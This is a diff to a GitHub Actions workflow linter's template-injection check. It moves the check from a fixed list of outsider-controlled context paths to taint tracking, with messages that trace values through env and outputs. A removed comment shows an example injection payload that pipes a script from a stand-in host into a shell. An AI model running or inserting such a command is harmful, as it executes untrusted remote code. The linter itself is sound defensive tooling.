@@ -18,10 +18,10 @@ from .expressions import (
     ExpressionError,
     context_paths,
     find_expressions,
-    is_ancestor,
     matches,
 )
 from .model import Finding, Severity
+from .taint import INPUT, OUTSIDER, TOJSON, Taint, Tracker
 from .workflow import Workflow, get, key_node, scalar
 
 
@@ -116,74 +116,42 @@ def write_all(wf: Workflow) -> Iterator[Finding]:
 
 # --- WG004 template injection ---------------------------------------------------------------
 
-# Context values an outsider controls: titles, bodies, branch names, commit messages...
-# Placed straight into a shell script, "a`; curl evil.sh | sh`" in a PR title runs as code.
-# Paths as context_paths() returns them: lower case, "*" for any array element.
-_UNTRUSTED: tuple[tuple[str, ...], ...] = tuple(
-    tuple(p.split("."))
-    for p in (
-        "github.head_ref",
-        "github.event.issue.title",
-        "github.event.issue.body",
-        "github.event.pull_request.title",
-        "github.event.pull_request.body",
-        "github.event.pull_request.head.ref",
-        "github.event.pull_request.head.label",
-        "github.event.pull_request.head.repo.default_branch",
-        "github.event.comment.body",
-        "github.event.review.body",
-        "github.event.review_comment.body",
-        "github.event.discussion.title",
-        "github.event.discussion.body",
-        "github.event.pages.*.page_name",
-        "github.event.commits.*.message",
-        "github.event.commits.*.author.email",
-        "github.event.commits.*.author.name",
-        "github.event.head_commit.message",
-        "github.event.head_commit.author.email",
-        "github.event.head_commit.author.name",
-        "github.event.workflow_run.head_branch",
-        "github.event.workflow_run.head_commit.message",
-        "github.event.workflow_run.head_commit.author.email",
-        "github.event.workflow_run.head_commit.author.name",
-    )
-)
+_ADVICE = "pass it through 'env:' and use the variable instead"
 
 
-def _untrusted_value(path: ContextPath, in_action: bool) -> tuple[Severity, str] | None:
-    """Severity and message if ``path`` can carry text an outsider (or a caller) chose."""
-    if any(matches(path.segments, pattern) for pattern in _UNTRUSTED):
-        return Severity.HIGH, (
-            f"'{path}' can be set by outsiders and is pasted into a script;"
-            " pass it through 'env:' and use the variable instead"
-        )
-    if path.function == "tojson":
-        inside = next((p for p in _UNTRUSTED if is_ancestor(path.segments, p)), None)
-        if inside is not None:
-            return Severity.HIGH, (
-                f"toJSON({path}) includes values outsiders can set, such as '{'.'.join(inside)}',"
-                " and is pasted into a script; pass it through 'env:' and use the variable instead"
+def _injection_message(path: ContextPath, taint: Taint) -> str:
+    """Direct uses keep their short message; a detour through env/outputs is spelled out."""
+    if not taint.via:
+        if taint.kind == TOJSON:
+            return (
+                f"toJSON({taint.source}) includes values outsiders can set, such as '{taint.example}',"
+                f" and is pasted into a script; {_ADVICE}"
             )
-    # In a composite action, inputs come from whichever workflow calls it, and that workflow may
-    # pass a pull request title straight through: the action can't know, so it must not trust them.
-    if in_action and len(path.segments) >= 2 and path.segments[0] == "inputs":
-        return Severity.MEDIUM, (
-            f"'{path}' comes from the calling workflow, which may pass untrusted"
-            " text, and is pasted into a script; pass it through 'env:' and use the"
-            " variable instead"
-        )
-    return None
+        if taint.kind == INPUT:
+            return (
+                f"'{taint.source}' comes from the calling workflow, which may pass untrusted"
+                f" text, and is pasted into a script; {_ADVICE}"
+            )
+        return f"'{taint.source}' can be set by outsiders and is pasted into a script; {_ADVICE}"
 
-
-def _paths(expr: Expression) -> list[ContextPath]:
-    try:
-        return context_paths(expr.inner)
-    except ExpressionError:
-        return []  # GitHub rejects the workflow before anything runs
+    origin = {
+        OUTSIDER: f"'{taint.source}', which outsiders can set",
+        TOJSON: f"toJSON({taint.source}), which includes values outsiders can set",
+        INPUT: f"'{taint.source}' from the calling workflow, which may be untrusted",
+    }[taint.kind]
+    if path.segments[0] == "env":
+        # The variable is already in the environment: the shell can read it without pasting.
+        name = taint.via[-1].split(" ", 1)[0].removeprefix("env.").removeprefix("$")
+        advice = f'use the shell variable "${name}" instead'
+    else:
+        advice = _ADVICE
+    return f"'{path}' carries {origin} (via {' -> '.join(taint.via)}) and is pasted into a script; {advice}"
 
 
 def template_injection(wf: Workflow) -> Iterator[Finding]:
-    for step in wf.steps():
+    tracker = Tracker(wf)
+    for tracked in tracker.steps():
+        step = tracked.step
         targets = [get(step.node, "run")]
         if (step.uses or "").startswith("actions/github-script@"):
             targets.append(get(get(step.node, "with"), "script"))
@@ -191,14 +159,23 @@ def template_injection(wf: Workflow) -> Iterator[Finding]:
             if not isinstance(node, ScalarNode):
                 continue
             for expr in find_expressions(node.value):
-                hit = next((r for path in _paths(expr) if (r := _untrusted_value(path, wf.is_action))), None)
+                hit = tracker.taint_of_expression(expr, tracked.scope)
                 if hit is None:
                     continue
                 offset = node.value.count("\n", 0, expr.start)
                 if node.style in ("|", ">"):
                     offset += 1  # the text starts on the line after "run: |"
-                severity, message = hit
-                yield _at(wf, node, "WG004", severity, message, line_offset=offset)
+                path, taint = hit
+                yield _at(
+                    wf, node, "WG004", taint.severity, _injection_message(path, taint), line_offset=offset
+                )
+
+
+def _paths(expr: Expression) -> list[ContextPath]:
+    try:
+        return context_paths(expr.inner)
+    except ExpressionError:
+        return []  # GitHub rejects the workflow before anything runs
 
 
 # --- WG005 pull_request_target ---------------------------------------------------------------
